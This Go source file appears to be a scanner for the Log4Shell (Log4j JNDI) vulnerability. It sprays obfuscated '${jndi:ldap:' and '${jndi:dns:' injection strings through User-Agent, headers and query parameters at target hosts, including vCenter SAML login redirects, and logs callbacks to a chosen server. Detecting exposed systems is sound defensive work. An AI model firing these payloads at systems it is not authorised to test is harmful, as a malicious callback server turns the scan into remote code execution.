package cmd

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"
        "strings"

	"github.com/pterm/pterm"
	log "github.com/sirupsen/logrus"
)

func ScanIP(hostUrl string, serverUrlLDAP string, serverUrlDNS string, reqType string, wg *sync.WaitGroup, resChan chan string) {
        defer wg.Done()
        const timeoutInterval = 2

        client := &http.Client{
                Timeout: 2 * timeoutInterval * time.Second,
                Transport: &http.Transport{
                        TLSHandshakeTimeout:   timeoutInterval * time.Second,
                        ResponseHeaderTimeout: timeoutInterval * time.Second,
                        ExpectContinueTimeout: timeoutInterval * time.Second,
                        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
                },
        }

        log.Debugf("Target URL: %s", hostUrl)
        var LDAPpayloads = []string{
                "${jndi:ldap:",
                "${${::-j}ndi:ldap:",
                "${${lower:jndi}:${lower:ldap}:",
                "${${lower:${lower:jndi}}:${lower:ldap}:",
                "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}:",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:",
                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}${lower:p}}:",
        }

        var DNSpayloads = []string{
                "${jndi:dns:",
                "${${::-j}ndi:dns:",
                "${${lower:jndi}:${lower:dns}:",
                "${${lower:${lower:jndi}}:${lower:dns}:",
                "${${lower:j}${lower:n}${lower:d}i:${lower:dns}:",
                "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}:",
                "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}:",
        }

        switch reqType {
        case "LDAP":
                if strings.Contains(hostUrl, "ui/login") {
                        wgLDAPUi := sync.WaitGroup{}
                        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
                        return http.ErrUseLastResponse
                        }
                        for _, LDAPpayload := range LDAPpayloads {
                                wgLDAPUi.Add(1)
                                go ScanIPLDAPUi(hostUrl, serverUrlLDAP, LDAPpayload, client, &wgLDAPUi, resChan)
                        }
                        wgLDAPUi.Wait()
                } else{
                        wgLDAP := sync.WaitGroup{}
                        for _, LDAPpayload := range LDAPpayloads {
                                wgLDAP.Add(1)
                                go ScanIPLDAP(hostUrl, serverUrlLDAP, LDAPpayload, client, &wgLDAP, resChan)
                        }
                        wgLDAP.Wait()
                }
        case "DNS":
                if strings.Contains(hostUrl, "ui/login") {
                        wgDNSUi := sync.WaitGroup{}
                        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
                        return http.ErrUseLastResponse
                        }
                        for _, DNSpayload := range DNSpayloads {
                                wgDNSUi.Add(1)
                                go ScanIPDNSUi(hostUrl, serverUrlDNS, DNSpayload, client, &wgDNSUi, resChan)
                        }
                        wgDNSUi.Wait()
                } else {
                        wgDNS := sync.WaitGroup{}
                        for _, DNSpayload := range DNSpayloads {
                                wgDNS.Add(1)
                                go ScanIPDNS(hostUrl, serverUrlDNS, DNSpayload, client, &wgDNS, resChan)
                        }
                        wgDNS.Wait()
                }
        }
}

func ScanIPLDAPUi(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
        defer wg.Done()
        baseUrl, err := url.Parse(Url)
        targetUrl := baseUrl.String()
        request, err := http.NewRequest("GET", targetUrl, nil)
        if err != nil {
                pterm.Error.Println(err)
                log.Fatal(err)
        }
        response, err := client.Do(request)
        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                log.Debug(err)
        }
        if response != nil {
                redirectUrl := response.Header.Get("location")
                if len(redirectUrl) > 0  {
                        newUrl, _ := url.Parse(redirectUrl)
                        newTargetUrl := fmt.Sprintf("%s://%s%s?SAMLRequest=", newUrl.Scheme, newUrl.Host, newUrl.Path)
                        traceHint := fmt.Sprintf("%s_%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
                        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
                        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
                        newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
                        newRequest.Header.Set("User-Agent", targetUserAgent)
                        addCommonHeaders(&newRequest.Header,targetHeader)
                        newResponse, err := client.Do(newRequest)
                        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                log.Debug(err)
                        }
                        if newResponse != nil {
                                url := strings.Split(Url, ":")
                                if len(url) != 3 {
                                        log.Fatal("Error in response hostUrl parsing:", url)
                                }
                                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
                                updateCsvRecords(msg)
                                resChan <- msg
                                log.Infof(msg)
                        }
                }
        }

}

func ScanIPLDAP(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
        defer wg.Done()
        baseUrl, err := url.Parse(Url)
        param := url.Values{}
        traceHint := fmt.Sprintf("%s_%s", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
        param.Add("x", fmt.Sprintf("%s//%s/%s_GET}", payload, serverUrl, traceHint))
        baseUrl.RawQuery = param.Encode()
        targetUrl := baseUrl.String()
        request, err := http.NewRequest("GET", targetUrl, nil)
        if err != nil {
                pterm.Error.Println(err)
                log.Fatal(err)
        }
        request.Header.Set("User-Agent", targetUserAgent)
        addCommonHeaders(&request.Header,targetHeader)
        response, err := client.Do(request)
        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                log.Debug(err)
        }
        if response != nil {
                url := strings.Split(Url, ":")
                if len(url) != 3 {
                        log.Fatal("Error in response hostUrl parsing:", url)
                }
                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
                updateCsvRecords(msg)
                resChan <- msg
                log.Infof(msg)
        }

}

func ScanIPDNSUi(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
        defer wg.Done()
        baseUrl, _ := url.Parse(Url)
        targetUrl := baseUrl.String()
        request, err := http.NewRequest("GET", targetUrl, nil)
        request.Close = true
        if err != nil {
                pterm.Error.Println(err)
                log.Fatal(err)
        }
        response, err := client.Do(request)
        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                log.Debug(err)
        }
        if response != nil {
                redirectUrl := response.Header.Get("location")
                if len(redirectUrl) > 0  {
                        newUrl, _ := url.Parse(redirectUrl)
                        // newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
                        newTargetUrl := fmt.Sprintf("%s://%s%s?SAMLRequest=", newUrl.Scheme, newUrl.Host, newUrl.Path)
                        traceHint := fmt.Sprintf("%s_%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
                        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
                        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
                        newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
                        newRequest.Header.Set("User-Agent", targetUserAgent)
                        addCommonHeaders(&newRequest.Header,targetHeader)
                        newResponse, err := client.Do(newRequest)
                        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                                log.Debug(err)
                        }
                        if newResponse != nil {
                                url := strings.Split(Url, ":")
                                if len(url) != 3 {
                                        log.Fatal("Error in response hostUrl parsing:", url)
                                }
                                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], newResponse.StatusCode)
                                updateCsvRecords(msg)
                                resChan <- msg
                                log.Infof(msg)
                        }
                }
        }
}

func ScanIPDNS(Url string, serverUrl string, payload string, client *http.Client, wg *sync.WaitGroup, resChan chan string) {
        defer wg.Done()
        baseUrl, err := url.Parse(Url)
        param := url.Values{}
        traceHint := fmt.Sprintf("%s_%s", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
        targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
        targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
        param.Add("x", fmt.Sprintf("%s//%s/%s_GET}", payload, serverUrl, traceHint))
        baseUrl.RawQuery = param.Encode()
        targetUrl := baseUrl.String()
        request, err := http.NewRequest("GET", targetUrl, nil)
        if err != nil {
                pterm.Error.Println(err)
                log.Fatal(err)
        }
        request.Header.Set("User-Agent", targetUserAgent)
        addCommonHeaders(&request.Header,targetHeader)
        response, err := client.Do(request)
        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
                log.Debug(err)
        }
        if response != nil {
                url := strings.Split(Url, ":")
                if len(url) != 3 {
                        log.Fatal("Error in response hostUrl parsing:", url)
                }
                msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
                updateCsvRecords(msg)
                resChan <- msg
                log.Infof(msg)
        }
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
